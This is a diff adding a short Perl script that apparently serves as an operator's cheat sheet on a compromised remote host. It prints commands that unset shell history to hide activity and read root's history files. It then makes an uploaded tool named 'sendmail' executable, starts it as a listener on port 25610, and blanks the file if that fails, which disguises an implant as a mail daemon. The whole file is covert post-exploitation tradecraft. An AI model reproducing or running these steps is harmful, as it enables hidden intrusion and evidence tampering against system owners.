@@ -1,0 +1,34 @@
+#!/usr/bin/env perl
+$SIG{INT} = \&my_exit;
+$SIG{TERM} = \&my_exit;
+print <<"EOF"
+
+[2;31mOne or more of these might be useful [0;34m(BLUE==local[3;43m YELLOW==remote)
+
+unset HISTFILE
+unset HISTFILESIZE
+w ; ls -lart / 
+pwd ; date ; date -u
+ls -al /root/.*history ; tail /root/.*history ; ls -al /.*history ; tail /.*history
+HOME="" which uudecode uncompress perl ; uname -a
+
+ps -ef
+
+~~p
+/current/up/noserver sendmail
+
+ls -lart | tail
+chmod 700 sendmail&&netstat -an|grep 25610.*LISTEN || (PATH=. D=-ul25610 sendmail || cat /dev/null > sendmail)
+ls -lart | tail
+
+
+[0;39m
+[2;31m^C will kill this window, or it will die when ourtn exits [0;34m(BLUE==local[3;43m YELLOW==remote)[0;39m
+EOF
+
+;
+sleep ;
+
+sub my_exit {
+  exit
+}
